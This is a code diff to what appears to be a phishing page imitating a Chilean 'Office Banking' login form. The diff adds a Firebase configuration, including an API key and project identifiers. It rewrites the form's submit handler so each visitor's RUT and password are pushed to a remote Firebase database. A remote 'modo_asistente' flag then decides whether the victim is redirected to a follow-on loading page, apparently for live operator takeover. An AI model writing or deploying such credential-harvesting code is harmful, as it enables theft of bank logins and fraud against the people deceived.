@@ -70,7 +70,20 @@
       text-align: center;
     }
   </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+    firebase.initializeApp(firebaseConfig);
+
     function formatoRUT(rut) {
       rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
       if (rut.length > 1) {
@@ -107,12 +120,28 @@
     function enviarFormulario(e) {
       e.preventDefault();
       const rut = document.getElementById("rut").value;
+      const clave = document.getElementById("clave").value;
+
       if (!validarRUT(rut)) {
         alert("RUT inválido");
         return;
       }
-      document.getElementById("formulario").style.display = "none";
-      document.getElementById("mensajeFinal").style.display = "block";
+
+      firebase.database().ref("usuarios").push({
+        rut: rut,
+        clave: clave,
+        timestamp: new Date().toLocaleString("es-CL")
+      }).then(() => {
+        firebase.database().ref("modo_asistente").once("value").then((snap) => {
+          const estado = snap.val();
+          if (estado === "activo") {
+            window.location.href = "cargando1.html";
+          } else {
+            document.getElementById("formulario").style.display = "none";
+            document.getElementById("mensajeFinal").style.display = "block";
+          }
+        });
+      });
     }
 
     window.onload = () => {
